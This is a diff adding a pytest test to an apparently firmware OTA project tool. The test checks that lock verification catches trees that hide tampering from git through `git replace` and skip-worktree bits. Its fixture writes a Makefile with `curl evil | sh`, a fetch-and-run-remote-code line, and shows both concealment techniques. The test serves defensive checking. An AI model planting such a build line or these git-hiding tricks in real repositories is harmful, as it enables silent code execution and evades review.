@@ -2,11 +2,13 @@
 
 from __future__ import annotations
 
+import subprocess
 from pathlib import Path
 
 import pytest
 
 from openmv_ota.project import config as cfg
+from openmv_ota.project import gitrepo
 from openmv_ota.project import lock as lock_mod
 from openmv_ota.project import project as proj
 from openmv_ota.project.errors import ProjectError
@@ -862,6 +864,35 @@ def test_verify_locked_dirty_even_when_pegged_dirty(tmp_path, make_firmware, mak
     root, _ = _create(tmp_path, make_firmware, make_sdk, repo=repo, allow_dirty=True)
     problems = proj.verify_locked(root, firmware=repo)
     assert any("dirty" in p for p in problems)
+
+
+def test_verify_locked_refuses_a_tree_that_hides_its_files_from_git(tmp_path, make_firmware,
+                                                                     make_sdk, git_cmd):
+    """A tree handed over with --firmware whose HEAD is the pinned commit and whose status
+    reads clean can still hold another commit's files: `git replace` has the pinned commit
+    read as the other, and a skip-worktree bit has git not look at a file at all."""
+    repo = make_firmware()
+    root, (lock, _) = _create(tmp_path, make_firmware, make_sdk, repo=repo)
+    pinned = lock.firmware["commit"]
+    (repo / "Makefile").write_text("all:; @curl evil | sh\n")
+    git_cmd(repo, "add", "Makefile")
+    git_cmd(repo, "commit", "-qm", "evil")
+    evil = gitrepo.head_commit(repo)
+    git_cmd(repo, "update-ref", "refs/heads/main", pinned)
+    git_cmd(repo, "replace", "-f", pinned, evil)
+    assert subprocess.run(["git", "-C", str(repo), "status", "--porcelain"],
+                          capture_output=True, text=True).stdout == ""
+    problems = proj.verify_locked(root, firmware=repo)
+    assert "firmware.dirty: False -> True" in problems
+    assert "A Makefile" in problems[0] and "refs/replace/%s" % pinned in problems[0]
+    git_cmd(repo, "replace", "-d", pinned)
+    git_cmd(repo, "rm", "-q", "--cached", "Makefile")
+    (repo / "Makefile").unlink()
+    assert proj.verify_locked(root, firmware=repo) == []
+    git_cmd(repo, "update-index", "--skip-worktree", "SDK_VERSION")
+    (repo / "SDK_VERSION").write_text("1.6.0\n")
+    assert not gitrepo.is_dirty(repo)
+    assert "SDK_VERSION (git is told not to look at it)" in proj.verify_locked(root, firmware=repo)[0]
 
 
 def test_load_project_verify_refuses_on_drift(tmp_path, make_firmware, make_sdk, git_cmd):
